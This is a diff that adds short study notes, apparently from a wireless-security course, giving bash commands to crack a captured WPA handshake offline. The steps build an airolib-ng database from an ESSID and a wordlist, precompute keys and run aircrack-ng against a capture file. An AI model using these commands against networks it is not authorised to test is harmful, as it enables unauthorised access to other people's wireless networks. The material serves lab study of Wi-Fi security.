@@ -1,0 +1,35 @@
+* Adding ESSID to file
+@code bash
+echo wifu > essid.txt
+@end
+___
+
+* Create database and import essid
+@code bash
+airolib-ng wifu.sqlite --import essid essid.txt
+@end
+___
+
+* Verifying stats
+@code bash
+airolib-ng wifu.sqlite --stats
+@end
+___
+
+* Import password list to database
+@code bash
+airolib-ng wifu.sqlite --import passwd /usr/share/john/password.lst
+@end
+___
+
+* Batch results and crack with aircrack-ng
+@code bash
+# Batch
+airolib-ng wifu.sqlite --batch
+
+# Verify
+airolib-ng wifu.sqlite --stats
+
+# Crack
+aircrack-ng -r wifu.sqlite wpa1-01.cap
+@end
